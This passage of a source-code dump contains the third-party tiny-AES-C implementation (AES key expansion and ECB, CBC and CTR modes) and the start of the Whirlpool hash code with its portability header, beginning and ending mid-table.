  0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d };

// The round constant word array, Rcon[i], contains the values given by 
// x to the power (i-1) being powers of x (x is denoted as {02}) in the field GF(2^8)
static const uint8_t Rcon[11] = {
  0x8d, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36 };

/*
 * Jordan Goulder points out in PR #12 (https://github.com/kokke/tiny-AES-C/pull/12),
 * that you can remove most of the elements in the Rcon array, because they are unused.
 *
 * From Wikipedia's article on the Rijndael key schedule @ https://en.wikipedia.org/wiki/Rijndael_key_schedule#Rcon
 * 
 * "Only the first some of these constants are actually used – up to rcon[10] for AES-128 (as 11 round keys are needed), 
 *  up to rcon[8] for AES-192, up to rcon[7] for AES-256. rcon[0] is not used in AES algorithm."
 */


/*****************************************************************************/
/* Private functions:                                                        */
/*****************************************************************************/
/*
static uint8_t getSBoxValue(uint8_t num)
{
  return sbox[num];
}
*/
#define getSBoxValue(num) (sbox[(num)])
/*
static uint8_t getSBoxInvert(uint8_t num)
{
  return rsbox[num];
}
*/
#define getSBoxInvert(num) (rsbox[(num)])

// This function produces Nb(Nr+1) round keys. The round keys are used in each round to decrypt the states. 
static void KeyExpansion(uint8_t* RoundKey, const uint8_t* Key)
{
  unsigned i, j, k;
  uint8_t tempa[4]; // Used for the column/row operations
  
  // The first round key is the key itself.
  for (i = 0; i < Nk; ++i)
  {
    RoundKey[(i * 4) + 0] = Key[(i * 4) + 0];
    RoundKey[(i * 4) + 1] = Key[(i * 4) + 1];
    RoundKey[(i * 4) + 2] = Key[(i * 4) + 2];
    RoundKey[(i * 4) + 3] = Key[(i * 4) + 3];
  }

  // All other round keys are found from the previous round keys.
  for (i = Nk; i < Nb * (Nr + 1); ++i)
  {
    {
      k = (i - 1) * 4;
      tempa[0]=RoundKey[k + 0];
      tempa[1]=RoundKey[k + 1];
      tempa[2]=RoundKey[k + 2];
      tempa[3]=RoundKey[k + 3];

    }

    if (i % Nk == 0)
    {
      // This function shifts the 4 bytes in a word to the left once.
      // [a0,a1,a2,a3] becomes [a1,a2,a3,a0]

      // Function RotWord()
      {
        const uint8_t u8tmp = tempa[0];
        tempa[0] = tempa[1];
        tempa[1] = tempa[2];
        tempa[2] = tempa[3];
        tempa[3] = u8tmp;
      }

      // SubWord() is a function that takes a four-byte input word and 
      // applies the S-box to each of the four bytes to produce an output word.

      // Function Subword()
      {
        tempa[0] = getSBoxValue(tempa[0]);
        tempa[1] = getSBoxValue(tempa[1]);
        tempa[2] = getSBoxValue(tempa[2]);
        tempa[3] = getSBoxValue(tempa[3]);
      }

      tempa[0] = tempa[0] ^ Rcon[i/Nk];
    }
#if defined(AES256) && (AES256 == 1)
    if (i % Nk == 4)
    {
      // Function Subword()
      {
        tempa[0] = getSBoxValue(tempa[0]);
        tempa[1] = getSBoxValue(tempa[1]);
        tempa[2] = getSBoxValue(tempa[2]);
        tempa[3] = getSBoxValue(tempa[3]);
      }
    }
#endif
    j = i * 4; k=(i - Nk) * 4;
    RoundKey[j + 0] = RoundKey[k + 0] ^ tempa[0];
    RoundKey[j + 1] = RoundKey[k + 1] ^ tempa[1];
    RoundKey[j + 2] = RoundKey[k + 2] ^ tempa[2];
    RoundKey[j + 3] = RoundKey[k + 3] ^ tempa[3];
  }
}

void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key)
{
  KeyExpansion(ctx->RoundKey, key);
}
#if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))
void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv)
{
  KeyExpansion(ctx->RoundKey, key);
  memcpy (ctx->Iv, iv, AES_BLOCKLEN);
}
void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv)
{
  memcpy (ctx->Iv, iv, AES_BLOCKLEN);
}
#endif

// This function adds the round key to state.
// The round key is added to the state by an XOR function.
static void AddRoundKey(uint8_t round, state_t* state, const uint8_t* RoundKey)
{
  uint8_t i,j;
  for (i = 0; i < 4; ++i)
  {
    for (j = 0; j < 4; ++j)
    {
      (*state)[i][j] ^= RoundKey[(round * Nb * 4) + (i * Nb) + j];
    }
  }
}

// The SubBytes Function Substitutes the values in the
// state matrix with values in an S-box.
static void SubBytes(state_t* state)
{
  uint8_t i, j;
  for (i = 0; i < 4; ++i)
  {
    for (j = 0; j < 4; ++j)
    {
      (*state)[j][i] = getSBoxValue((*state)[j][i]);
    }
  }
}

// The ShiftRows() function shifts the rows in the state to the left.
// Each row is shifted with different offset.
// Offset = Row number. So the first row is not shifted.
static void ShiftRows(state_t* state)
{
  uint8_t temp;

  // Rotate first row 1 columns to left  
  temp           = (*state)[0][1];
  (*state)[0][1] = (*state)[1][1];
  (*state)[1][1] = (*state)[2][1];
  (*state)[2][1] = (*state)[3][1];
  (*state)[3][1] = temp;

  // Rotate second row 2 columns to left  
  temp           = (*state)[0][2];
  (*state)[0][2] = (*state)[2][2];
  (*state)[2][2] = temp;

  temp           = (*state)[1][2];
  (*state)[1][2] = (*state)[3][2];
  (*state)[3][2] = temp;

  // Rotate third row 3 columns to left
  temp           = (*state)[0][3];
  (*state)[0][3] = (*state)[3][3];
  (*state)[3][3] = (*state)[2][3];
  (*state)[2][3] = (*state)[1][3];
  (*state)[1][3] = temp;
}

static uint8_t xtime(uint8_t x)
{
  return ((x<<1) ^ (((x>>7) & 1) * 0x1b));
}

// MixColumns function mixes the columns of the state matrix
static void MixColumns(state_t* state)
{
  uint8_t i;
  uint8_t Tmp, Tm, t;
  for (i = 0; i < 4; ++i)
  {  
    t   = (*state)[i][0];
    Tmp = (*state)[i][0] ^ (*state)[i][1] ^ (*state)[i][2] ^ (*state)[i][3] ;
    Tm  = (*state)[i][0] ^ (*state)[i][1] ; Tm = xtime(Tm);  (*state)[i][0] ^= Tm ^ Tmp ;
    Tm  = (*state)[i][1] ^ (*state)[i][2] ; Tm = xtime(Tm);  (*state)[i][1] ^= Tm ^ Tmp ;
    Tm  = (*state)[i][2] ^ (*state)[i][3] ; Tm = xtime(Tm);  (*state)[i][2] ^= Tm ^ Tmp ;
    Tm  = (*state)[i][3] ^ t ;              Tm = xtime(Tm);  (*state)[i][3] ^= Tm ^ Tmp ;
  }
}

// Multiply is used to multiply numbers in the field GF(2^8)
// Note: The last call to xtime() is unneeded, but often ends up generating a smaller binary
//       The compiler seems to be able to vectorize the operation better this way.
//       See https://github.com/kokke/tiny-AES-c/pull/34
#if MULTIPLY_AS_A_FUNCTION
static uint8_t Multiply(uint8_t x, uint8_t y)
{
  return (((y & 1) * x) ^
       ((y>>1 & 1) * xtime(x)) ^
       ((y>>2 & 1) * xtime(xtime(x))) ^
       ((y>>3 & 1) * xtime(xtime(xtime(x)))) ^
       ((y>>4 & 1) * xtime(xtime(xtime(xtime(x)))))); /* this last call to xtime() can be omitted */
  }
#else
#define Multiply(x, y)                                \
      (  ((y & 1) * x) ^                              \
      ((y>>1 & 1) * xtime(x)) ^                       \
      ((y>>2 & 1) * xtime(xtime(x))) ^                \
      ((y>>3 & 1) * xtime(xtime(xtime(x)))) ^         \
      ((y>>4 & 1) * xtime(xtime(xtime(xtime(x))))))   \

#endif

#if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)
// MixColumns function mixes the columns of the state matrix.
// The method used to multiply may be difficult to understand for the inexperienced.
// Please use the references to gain more information.
static void InvMixColumns(state_t* state)
{
  int i;
  uint8_t a, b, c, d;
  for (i = 0; i < 4; ++i)
  { 
    a = (*state)[i][0];
    b = (*state)[i][1];
    c = (*state)[i][2];
    d = (*state)[i][3];

    (*state)[i][0] = Multiply(a, 0x0e) ^ Multiply(b, 0x0b) ^ Multiply(c, 0x0d) ^ Multiply(d, 0x09);
    (*state)[i][1] = Multiply(a, 0x09) ^ Multiply(b, 0x0e) ^ Multiply(c, 0x0b) ^ Multiply(d, 0x0d);
    (*state)[i][2] = Multiply(a, 0x0d) ^ Multiply(b, 0x09) ^ Multiply(c, 0x0e) ^ Multiply(d, 0x0b);
    (*state)[i][3] = Multiply(a, 0x0b) ^ Multiply(b, 0x0d) ^ Multiply(c, 0x09) ^ Multiply(d, 0x0e);
  }
}


// The SubBytes Function Substitutes the values in the
// state matrix with values in an S-box.
static void InvSubBytes(state_t* state)
{
  uint8_t i, j;
  for (i = 0; i < 4; ++i)
  {
    for (j = 0; j < 4; ++j)
    {
      (*state)[j][i] = getSBoxInvert((*state)[j][i]);
    }
  }
}

static void InvShiftRows(state_t* state)
{
  uint8_t temp;

  // Rotate first row 1 columns to right  
  temp = (*state)[3][1];
  (*state)[3][1] = (*state)[2][1];
  (*state)[2][1] = (*state)[1][1];
  (*state)[1][1] = (*state)[0][1];
  (*state)[0][1] = temp;

  // Rotate second row 2 columns to right 
  temp = (*state)[0][2];
  (*state)[0][2] = (*state)[2][2];
  (*state)[2][2] = temp;

  temp = (*state)[1][2];
  (*state)[1][2] = (*state)[3][2];
  (*state)[3][2] = temp;

  // Rotate third row 3 columns to right
  temp = (*state)[0][3];
  (*state)[0][3] = (*state)[1][3];
  (*state)[1][3] = (*state)[2][3];
  (*state)[2][3] = (*state)[3][3];
  (*state)[3][3] = temp;
}
#endif // #if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)

// Cipher is the main function that encrypts the PlainText.
static void Cipher(state_t* state, const uint8_t* RoundKey)
{
  uint8_t round = 0;

  // Add the First round key to the state before starting the rounds.
  AddRoundKey(0, state, RoundKey); 
  
  // There will be Nr rounds.
  // The first Nr-1 rounds are identical.
  // These Nr-1 rounds are executed in the loop below.
  for (round = 1; round < Nr; ++round)
  {
    SubBytes(state);
    ShiftRows(state);
    MixColumns(state);
    AddRoundKey(round, state, RoundKey);
  }
  
  // The last round is given below.
  // The MixColumns function is not here in the last round.
  SubBytes(state);
  ShiftRows(state);
  AddRoundKey(Nr, state, RoundKey);
}

#if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)
static void InvCipher(state_t* state, const uint8_t* RoundKey)
{
  uint8_t round = 0;

  // Add the First round key to the state before starting the rounds.
  AddRoundKey(Nr, state, RoundKey); 

  // There will be Nr rounds.
  // The first Nr-1 rounds are identical.
  // These Nr-1 rounds are executed in the loop below.
  for (round = (Nr - 1); round > 0; --round)
  {
    InvShiftRows(state);
    InvSubBytes(state);
    AddRoundKey(round, state, RoundKey);
    InvMixColumns(state);
  }
  
  // The last round is given below.
  // The MixColumns function is not here in the last round.
  InvShiftRows(state);
  InvSubBytes(state);
  AddRoundKey(0, state, RoundKey);
}
#endif // #if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)

/*****************************************************************************/
/* Public functions:                                                         */
/*****************************************************************************/
#if defined(ECB) && (ECB == 1)


void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf)
{
  // The next function call encrypts the PlainText with the Key using AES algorithm.
  Cipher((state_t*)buf, ctx->RoundKey);
}

void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf)
{
  // The next function call decrypts the PlainText with the Key using AES algorithm.
  InvCipher((state_t*)buf, ctx->RoundKey);
}


#endif // #if defined(ECB) && (ECB == 1)





#if defined(CBC) && (CBC == 1)


static void XorWithIv(uint8_t* buf, const uint8_t* Iv)
{
  uint8_t i;
  for (i = 0; i < AES_BLOCKLEN; ++i) // The block in AES is always 128bit no matter the key size
  {
    buf[i] ^= Iv[i];
  }
}

void AES_CBC_encrypt_buffer(struct AES_ctx *ctx, uint8_t* buf, uint32_t length)
{
  uintptr_t i;
  uint8_t *Iv = ctx->Iv;
  for (i = 0; i < length; i += AES_BLOCKLEN)
  {
    XorWithIv(buf, Iv);
    Cipher((state_t*)buf, ctx->RoundKey);
    Iv = buf;
    buf += AES_BLOCKLEN;
    //printf("Step %d - %d", i/16, i);
  }
  /* store Iv in ctx for next call */
  memcpy(ctx->Iv, Iv, AES_BLOCKLEN);
}

void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf,  uint32_t length)
{
  uintptr_t i;
  uint8_t storeNextIv[AES_BLOCKLEN];
  for (i = 0; i < length; i += AES_BLOCKLEN)
  {
    memcpy(storeNextIv, buf, AES_BLOCKLEN);
    InvCipher((state_t*)buf, ctx->RoundKey);
    XorWithIv(buf, ctx->Iv);
    memcpy(ctx->Iv, storeNextIv, AES_BLOCKLEN);
    buf += AES_BLOCKLEN;
  }

}

#endif // #if defined(CBC) && (CBC == 1)



#if defined(CTR) && (CTR == 1)

/* Symmetrical operation: same function for encrypting as for decrypting. Note any IV/nonce should never be reused with the same key */
void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, uint32_t length)
{
  uint8_t buffer[AES_BLOCKLEN];
  
  unsigned i;
  int bi;
  for (i = 0, bi = AES_BLOCKLEN; i < length; ++i, ++bi)
  {
    if (bi == AES_BLOCKLEN) /* we need to regen xor compliment in buffer */
    {
      
      memcpy(buffer, ctx->Iv, AES_BLOCKLEN);
      Cipher((state_t*)buffer,ctx->RoundKey);

      /* Increment Iv and handle overflow */
      for (bi = (AES_BLOCKLEN - 1); bi >= 0; --bi)
      {
	/* inc will overflow */
        if (ctx->Iv[bi] == 255)
	{
          ctx->Iv[bi] = 0;
          continue;
        } 
        ctx->Iv[bi] += 1;
        break;   
      }
      bi = 0;
    }

    buf[i] = (buf[i] ^ buffer[bi]);
  }
}

#endif // #if defined(CTR) && (CTR == 1)


```

`Source/Shared/thirdparty/tinyaes/aes.h`:

```h
#ifndef _AES_H_
#define _AES_H_

#include <stdint.h>

// #define the macros below to 1/0 to enable/disable the mode of operation.
//
// CBC enables AES encryption in CBC-mode of operation.
// CTR enables encryption in counter-mode.
// ECB enables the basic ECB 16-byte block algorithm. All can be enabled simultaneously.

// The #ifndef-guard allows it to be configured before #include'ing or at compile time.
#ifndef CBC
  #define CBC 1
#endif

#ifndef ECB
  #define ECB 1
#endif

#ifndef CTR
  #define CTR 1
#endif


#define AES128 1
//#define AES192 1
//#define AES256 1

#define AES_BLOCKLEN 16 //Block length in bytes AES is 128b block only

#if defined(AES256) && (AES256 == 1)
    #define AES_KEYLEN 32
    #define AES_keyExpSize 240
#elif defined(AES192) && (AES192 == 1)
    #define AES_KEYLEN 24
    #define AES_keyExpSize 208
#else
    #define AES_KEYLEN 16   // Key length in bytes
    #define AES_keyExpSize 176
#endif

struct AES_ctx
{
  uint8_t RoundKey[AES_keyExpSize];
#if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))
  uint8_t Iv[AES_BLOCKLEN];
#endif
};

void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key);
#if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))
void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv);
void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv);
#endif

#if defined(ECB) && (ECB == 1)
// buffer size is exactly AES_BLOCKLEN bytes; 
// you need only AES_init_ctx as IV is not used in ECB 
// NB: ECB is considered insecure for most uses
void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf);
void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf);

#endif // #if defined(ECB) && (ECB == !)


#if defined(CBC) && (CBC == 1)
// buffer size MUST be mutile of AES_BLOCKLEN;
// Suggest https://en.wikipedia.org/wiki/Padding_(cryptography)#PKCS7 for padding scheme
// NOTES: you need to set IV in ctx via AES_init_ctx_iv() or AES_ctx_set_iv()
//        no IV should ever be reused with the same key 
void AES_CBC_encrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, uint32_t length);
void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, uint32_t length);

#endif // #if defined(CBC) && (CBC == 1)


#if defined(CTR) && (CTR == 1)

// Same function for encrypting as for decrypting. 
// IV is incremented for every block, and used after encryption as XOR-compliment for output
// Suggesting https://en.wikipedia.org/wiki/Padding_(cryptography)#PKCS7 for padding scheme
// NOTES: you need to set IV in ctx with AES_init_ctx_iv() or AES_ctx_set_iv()
//        no IV should ever be reused with the same key 
void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, uint32_t length);

#endif // #if defined(CTR) && (CTR == 1)


#endif //_AES_H_

```

`Source/Shared/thirdparty/whirlpool/nessie.h`:

```h

#ifndef PORTABLE_C__
#define PORTABLE_C__

#include <limits.h>

/* Definition of minimum-width integer types
 *
 * u8   -> unsigned integer type, at least 8 bits, equivalent to unsigned char
 * u16  -> unsigned integer type, at least 16 bits
 * u32  -> unsigned integer type, at least 32 bits
 *
 * s8, s16, s32  -> signed counterparts of u8, u16, u32
 *
 * Always use macro's T8(), T16() or T32() to obtain exact-width results,
 * i.e., to specify the size of the result of each expression.
 */

typedef signed char s8;
typedef unsigned char u8;

#if UINT_MAX >= 4294967295UL

typedef signed short s16;
typedef signed int s32;
typedef unsigned short u16;
typedef unsigned int u32;

#define ONE32   0xffffffffU

#else

typedef signed int s16;
typedef signed long s32;
typedef unsigned int u16;
typedef unsigned long u32;

#define ONE32   0xffffffffUL

#endif

#define ONE8    0xffU
#define ONE16   0xffffU

#define T8(x)   ((x) & ONE8)
#define T16(x)  ((x) & ONE16)
#define T32(x)  ((x) & ONE32)

#ifdef _MSC_VER
typedef unsigned __int64 u64;
typedef signed __int64 s64;
#define LL(v)   (v##i64)
#define ONE64   LL(0xffffffffffffffff)
#else  /* !_MSC_VER */
typedef unsigned long long u64;
typedef signed long long s64;
#define LL(v)   (v##ULL)
#define ONE64   LL(0xffffffffffffffff)
#endif /* ?_MSC_VER */
#define T64(x)  ((x) & ONE64)
#define ROTR64(v, n)   (((v) >> (n)) | T64((v) << (64 - (n))))
/*
 * Note: the test is used to detect native 64-bit architectures;
 * if the unsigned long is strictly greater than 32-bit, it is
 * assumed to be at least 64-bit. This will not work correctly
 * on (old) 36-bit architectures (PDP-11 for instance).
 *
 * On non-64-bit architectures, "long long" is used.
 */

/*
 * U8TO32_BIG(c) returns the 32-bit value stored in big-endian convention
 * in the unsigned char array pointed to by c.
*/
#define U8TO32_BIG(c)  (((u32)T8(*(c)) << 24) | ((u32)T8(*((c) + 1)) << 16) | ((u32)T8(*((c) + 2)) << 8) | ((u32)T8(*((c) + 3))))

/*
  * U8TO32_LITTLE(c) returns the 32-bit value stored in little-endian convention
  * in the unsigned char array pointed to by c.
*/
#define U8TO32_LITTLE(c)  (((u32)T8(*(c))) | ((u32)T8(*((c) + 1)) << 8) | (u32)T8(*((c) + 2)) << 16) | ((u32)T8(*((c) + 3)) << 24))

/*
  * U8TO32_BIG(c, v) stores the 32-bit-value v in big-endian convention
  * into the unsigned char array pointed to by c.
*/
#define U32TO8_BIG(c, v)    do { u32 x = (v); u8 *d = (c); d[0] = T8(x >> 24); d[1] = T8(x >> 16); d[2] = T8(x >> 8); d[3] = T8(x); } while (0)

/*
  * U8TO32_LITTLE(c, v) stores the 32-bit-value v in little-endian convention
  * into the unsigned char array pointed to by c.
*/
#define U32TO8_LITTLE(c, v)    do { u32 x = (v); u8 *d = (c); d[0] = T8(x); d[1] = T8(x >> 8); d[2] = T8(x >> 16); d[3] = T8(x >> 24); } while (0)

/*
      * ROTL32(v, n) returns the value of the 32-bit unsigned value v after
      * a rotation of n bits to the left. It might be replaced by the appropriate
      * architecture-specific macro.
      *
      * It evaluates v and n twice.
      *
      * The compiler might emit a warning if n is the constant 0. The result
      * is undefined if n is greater than 31.
*/
#define ROTL32(v, n)   (T32((v) << (n)) | ((v) >> (32 - (n))))

/*
* Whirlpool-specific definitions.
*/

#define DIGESTBYTES 64
#define DIGESTBITS  (8*DIGESTBYTES) /* 512 */

#define WBLOCKBYTES 64
#define WBLOCKBITS  (8*WBLOCKBYTES) /* 512 */

#define LENGTHBYTES 32
#define LENGTHBITS  (8*LENGTHBYTES) /* 256 */

typedef struct NESSIEstruct {
    u8  bitLength[LENGTHBYTES]; /* global number of hashed bits (256-bit counter) */
    u8  buffer[WBLOCKBYTES];	/* buffer of data to hash */
    int bufferBits;		        /* current number of bits on the buffer */
    int bufferPos;		        /* current (possibly incomplete) byte slot on the buffer */
    u64 hash[DIGESTBYTES / 8];    /* the hashing state */
} NESSIEstruct;

#endif   /* PORTABLE_C__ */

```

`Source/Shared/thirdparty/whirlpool/whirlpool.c`:

```c
/**
 * The Whirlpool hashing function.
 *
 * <P>
 * <b>References</b>
 *
 * <P>
 * The Whirlpool algorithm was developed by
 * <a href="mailto:pbarreto@scopus.com.br">Paulo S. L. M. Barreto</a> and
 * <a href="mailto:vincent.rijmen@cryptomathic.com">Vincent Rijmen</a>.
 *
 * See
 *      P.S.L.M. Barreto, V. Rijmen,
 *      ``The Whirlpool hashing function,''
 *      NESSIE submission, 2000 (tweaked version, 2001),
 *      <https://www.cosic.esat.kuleuven.ac.be/nessie/workshop/submissions/whirlpool.zip>
 *
 * @author  Paulo S.L.M. Barreto
 * @author  Vincent Rijmen.
 *
 * @version 3.0 (2003.03.12)
 *
 * =============================================================================
 *
 * Differences from version 2.1:
 *
 * - Suboptimal diffusion matrix replaced by cir(1, 1, 4, 1, 8, 5, 2, 9).
 *
 * =============================================================================
 *
 * Differences from version 2.0:
 *
 * - Generation of ISO/IEC 10118-3 test vectors.
 * - Bug fix: nonzero carry was ignored when tallying the data length
 *      (this bug apparently only manifested itself when feeding data
 *      in pieces rather than in a single chunk at once).
 * - Support for MS Visual C++ 64-bit integer arithmetic.
 *
 * Differences from version 1.0:
 *
 * - Original S-box replaced by the tweaked, hardware-efficient version.
 *
 * =============================================================================
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHORS ''AS IS'' AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR CONTRIBUTORS BE
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR
 * BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE
 * OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include "Whirlpool.h"
#include "nessie.h"

 /* #define TRACE_INTERMEDIATE_VALUES */

 /*
  * The number of rounds of the internal dedicated block cipher.
  */
#define R 10

  /*
   * Though Whirlpool is endianness-neutral, the encryption tables are listed
   * in BIG-ENDIAN format, which is adopted throughout this implementation
   * (but little-endian notation would be equally suitable if consistently
   * employed).
   */

//
// KDU modififed to shutup MSVC.
//
#if defined (_MSC_VER)
#pragma warning(push)
#pragma warning(disable: 4244)
#pragma warning(disable: 4245)
#pragma warning(disable: 26451)
#endif

static const u64 C0[256] = {
    LL(0x18186018c07830d8), LL(0x23238c2305af4626), LL(0xc6c63fc67ef991b8), LL(0xe8e887e8136fcdfb),
    LL(0x878726874ca113cb), LL(0xb8b8dab8a9626d11), LL(0x0101040108050209), LL(0x4f4f214f426e9e0d),
    LL(0x3636d836adee6c9b), LL(0xa6a6a2a6590451ff), LL(0xd2d26fd2debdb90c), LL(0xf5f5f3f5fb06f70e),
    LL(0x7979f979ef80f296), LL(0x6f6fa16f5fcede30), LL(0x91917e91fcef3f6d), LL(0x52525552aa07a4f8),
    LL(0x60609d6027fdc047), LL(0xbcbccabc89766535), LL(0x9b9b569baccd2b37), LL(0x8e8e028e048c018a),
    LL(0xa3a3b6a371155bd2), LL(0x0c0c300c603c186c), LL(0x7b7bf17bff8af684), LL(0x3535d435b5e16a80),
    LL(0x1d1d741de8693af5), LL(0xe0e0a7e05347ddb3), LL(0xd7d77bd7f6acb321), LL(0xc2c22fc25eed999c),
    LL(0x2e2eb82e6d965c43), LL(0x4b4b314b627a9629), LL(0xfefedffea321e15d), LL(0x575741578216aed5),
    LL(0x15155415a8412abd), LL(0x7777c1779fb6eee8), LL(0x3737dc37a5eb6e92), LL(0xe5e5b3e57b56d79e),
    LL(0x9f9f469f8cd92313), LL(0xf0f0e7f0d317fd23), LL(0x4a4a354a6a7f9420), LL(0xdada4fda9e95a944),
    LL(0x58587d58fa25b0a2), LL(0xc9c903c906ca8fcf), LL(0x2929a429558d527c), LL(0x0a0a280a5022145a),
    LL(0xb1b1feb1e14f7f50), LL(0xa0a0baa0691a5dc9), LL(0x6b6bb16b7fdad614), LL(0x85852e855cab17d9),
    LL(0xbdbdcebd8173673c), LL(0x5d5d695dd234ba8f), LL(0x1010401080502090), LL(0xf4f4f7f4f303f507),
    LL(0xcbcb0bcb16c08bdd), LL(0x3e3ef83eedc67cd3), LL(0x0505140528110a2d), LL(0x676781671fe6ce78),
    LL(0xe4e4b7e47353d597), LL(0x27279c2725bb4e02), LL(0x4141194132588273), LL(0x8b8b168b2c9d0ba7),
    LL(0xa7a7a6a7510153f6), LL(0x7d7de97dcf94fab2), LL(0x95956e95dcfb3749), LL(0xd8d847d88e9fad56),
    LL(0xfbfbcbfb8b30eb70), LL(0xeeee9fee2371c1cd), LL(0x7c7ced7cc791f8bb), LL(0x6666856617e3cc71),
    LL(0xdddd53dda68ea77b), LL(0x17175c17b84b2eaf), LL(0x4747014702468e45), LL(0x9e9e429e84dc211a),
    LL(0xcaca0fca1ec589d4), LL(0x2d2db42d75995a58), LL(0xbfbfc6bf9179632e), LL(0x07071c07381b0e3f),
    LL(0xadad8ead012347ac), LL(0x5a5a755aea2fb4b0), LL(0x838336836cb51bef), LL(0x3333cc3385ff66b6),
    LL(0x636391633ff2c65c), LL(0x02020802100a0412), LL(0xaaaa92aa39384993), LL(0x7171d971afa8e2de),
    LL(0xc8c807c80ecf8dc6), LL(0x19196419c87d32d1), LL(0x494939497270923b), LL(0xd9d943d9869aaf5f),
    LL(0xf2f2eff2c31df931), LL(0xe3e3abe34b48dba8), LL(0x5b5b715be22ab6b9), LL(0x88881a8834920dbc),
    LL(0x9a9a529aa4c8293e), LL(0x262698262dbe4c0b), LL(0x3232c8328dfa64bf), LL(0xb0b0fab0e94a7d59),
    LL(0xe9e983e91b6acff2), LL(0x0f0f3c0f78331e77), LL(0xd5d573d5e6a6b733), LL(0x80803a8074ba1df4),
    LL(0xbebec2be997c6127), LL(0xcdcd13cd26de87eb), LL(0x3434d034bde46889), LL(0x48483d487a759032),
    LL(0xffffdbffab24e354), LL(0x7a7af57af78ff48d), LL(0x90907a90f4ea3d64), LL(0x5f5f615fc23ebe9d),
    LL(0x202080201da0403d), LL(0x6868bd6867d5d00f), LL(0x1a1a681ad07234ca), LL(0xaeae82ae192c41b7),
    LL(0xb4b4eab4c95e757d), LL(0x54544d549a19a8ce), LL(0x93937693ece53b7f), LL(0x222288220daa442f),
    LL(0x64648d6407e9c863), LL(0xf1f1e3f1db12ff2a), LL(0x7373d173bfa2e6cc), LL(0x12124812905a2482),
    LL(0x40401d403a5d807a), LL(0x0808200840281048), LL(0xc3c32bc356e89b95), LL(0xecec97ec337bc5df),
    LL(0xdbdb4bdb9690ab4d), LL(0xa1a1bea1611f5fc0), LL(0x8d8d0e8d1c830791), LL(0x3d3df43df5c97ac8),
    LL(0x97976697ccf1335b), LL(0x0000000000000000), LL(0xcfcf1bcf36d483f9), LL(0x2b2bac2b4587566e),
    LL(0x7676c57697b3ece1), LL(0x8282328264b019e6), LL(0xd6d67fd6fea9b128), LL(0x1b1b6c1bd87736c3),
    LL(0xb5b5eeb5c15b7774), LL(0xafaf86af112943be), LL(0x6a6ab56a77dfd41d), LL(0x50505d50ba0da0ea),
    LL(0x45450945124c8a57), LL(0xf3f3ebf3cb18fb38), LL(0x3030c0309df060ad), LL(0xefef9bef2b74c3c4),
    LL(0x3f3ffc3fe5c37eda), LL(0x55554955921caac7), LL(0xa2a2b2a2791059db), LL(0xeaea8fea0365c9e9),
    LL(0x656589650fecca6a), LL(0xbabad2bab9686903), LL(0x2f2fbc2f65935e4a), LL(0xc0c027c04ee79d8e),
    LL(0xdede5fdebe81a160), LL(0x1c1c701ce06c38fc), LL(0xfdfdd3fdbb2ee746), LL(0x4d4d294d52649a1f),
    LL(0x92927292e4e03976), LL(0x7575c9758fbceafa), LL(0x06061806301e0c36), LL(0x8a8a128a249809ae),
    LL(0xb2b2f2b2f940794b), LL(0xe6e6bfe66359d185), LL(0x0e0e380e70361c7e), LL(0x1f1f7c1ff8633ee7),
    LL(0x6262956237f7c455), LL(0xd4d477d4eea3b53a), LL(0xa8a89aa829324d81), LL(0x96966296c4f43152),
    LL(0xf9f9c3f99b3aef62), LL(0xc5c533c566f697a3), LL(0x2525942535b14a10), LL(0x59597959f220b2ab),
    LL(0x84842a8454ae15d0), LL(0x7272d572b7a7e4c5), LL(0x3939e439d5dd72ec), LL(0x4c4c2d4c5a619816),
    LL(0x5e5e655eca3bbc94), LL(0x7878fd78e785f09f), LL(0x3838e038ddd870e5), LL(0x8c8c0a8c14860598),
    LL(0xd1d163d1c6b2bf17), LL(0xa5a5aea5410b57e4), LL(0xe2e2afe2434dd9a1), LL(0x616199612ff8c24e),
